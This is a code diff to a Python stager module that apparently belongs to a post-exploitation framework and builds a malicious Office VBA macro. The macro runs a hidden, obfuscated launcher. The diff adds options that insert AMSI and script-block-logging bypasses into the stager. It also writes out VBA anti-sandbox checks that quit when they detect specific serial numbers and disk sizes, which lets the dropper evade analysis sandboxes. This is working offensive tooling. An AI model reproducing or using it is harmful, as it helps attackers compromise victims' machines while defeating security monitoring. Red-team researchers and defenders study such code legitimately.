@@ -1,7 +1,11 @@
+from __future__ import print_function
+from builtins import str
+from builtins import range
+from builtins import object
 from lib.common import helpers
 import random, string
 
-class Stager:
+class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -37,9 +41,14 @@ class Stager:
                 'Value'         :   '0'
             },
             'OutFile' : {
-                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
+                'Description'   :   'File to output launcher to, otherwise displayed on the screen.',
                 'Required'      :   False,
-                'Value'         :   '/tmp/macro'
+                'Value'         :   ''
+            },
+            'Base64' : {
+                'Description'   :   'Switch. Base64 encode the output.',
+                'Required'      :   True,
+                'Value'         :   'True'
             },
             'Obfuscate' : {
                 'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
@@ -49,8 +58,13 @@ class Stager:
             'ObfuscateCommand' : {
                 'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                 'Required'      :   False,
-                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
+                'Value'         :   r'Token\All\1'
             },
+            'SafeChecks' : {
+                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
+                'Required'      :   True,
+                'Value'         :   'True'
+            },       
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -65,6 +79,26 @@ class Stager:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'ScriptLogBypass' : {
+                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass' : {
+                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass2' : {
+                'Description'   :   'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'False'
+            },
+	    'OutlookEvasion' : {
+                'Description'   :   'Include BC-Securty\'s Outlook Sandbox evasion code',
+                'Required'      :   False,
+                'Value'         :   'False'
             }
         }
 
@@ -84,24 +118,50 @@ class Stager:
         # extract all of our options
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
-        userAgent = self.options['UserAgent']['Value']
+        base64 = self.options['Base64']['Value']
         obfuscate = self.options['Obfuscate']['Value']
         obfuscateCommand = self.options['ObfuscateCommand']['Value']
+        userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
+        safeChecks = self.options['SafeChecks']['Value']
+        scriptLogBypass = self.options['ScriptLogBypass']['Value']
+        AMSIBypass = self.options['AMSIBypass']['Value']
+        AMSIBypass2 = self.options['AMSIBypass2']['Value']
+        OutlookEvasion = self.options['OutlookEvasion']['Value']
 
-        obfuscateScript = False
+        encode = False
+        if base64.lower() == "true":
+            encode = True
+
+        invokeObfuscation = False
         if obfuscate.lower() == "true":
-            obfuscateScript = True
+            invokeObfuscation = True
+
+        scriptLogBypassBool = False
+        if scriptLogBypass.lower() == "true":
+            scriptLogBypassBool = True
+
+        AMSIBypassBool = False
+        if AMSIBypass.lower() == "true":
+            AMSIBypassBool = True
+
+        AMSIBypass2Bool = False
+        if AMSIBypass2.lower() == "true":
+            AMSIBypass2Bool = True
+    
+        OutlookEvasionBool = False
+        if OutlookEvasion.lower() == "true":
+            OutlookEvasionBool = True
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
         Str = ''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
         Method=''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
 
         if launcher == "":
-            print helpers.color("[!] Error in launcher command generation.")
+            print(helpers.color("[!] Error in launcher command generation."))
             return ""
         else:
             chunks = list(helpers.chunks(launcher, 50))
@@ -122,10 +182,22 @@ class Stager:
             macro += "End Sub\n\n"
 
             macro += "Public Function "+Method+"() As Variant\n"
-            macro += payload
-            macro += "\tConst HIDDEN_WINDOW = 0\n"
             macro += "\tstrComputer = \".\"\n"
             macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n"
+            if OutlookEvasionBool == True:
+                macro += "\tSet ID = objWMIService.ExecQuery(\"Select IdentifyingNumber from Win32_ComputerSystemproduct\")\n"
+                macro += "\tFor Each objItem In ID\n"
+                macro += "\t\tIf StrComp(objItem.IdentifyingNumber, \"2UA20511KN\") = 0 Then End\n"
+                macro += "\tNext\n"    
+                macro += "\tSet disksize = objWMIService.ExecQuery(\"Select Size from Win32_logicaldisk\")\n"
+                macro += "\tFor Each objItem In disksize\n"
+                macro += "\t\tIf (objItem.Size = 42949603328#) Then End\n"
+                macro += "\t\tIf (objItem.Size = 68719443968#) Then End\n"
+                macro +="\tNext\n"
+                 
+            macro += payload
+            macro += "\tConst HIDDEN_WINDOW = 0\n"
+            
             macro += "\tSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n"
             macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
             macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
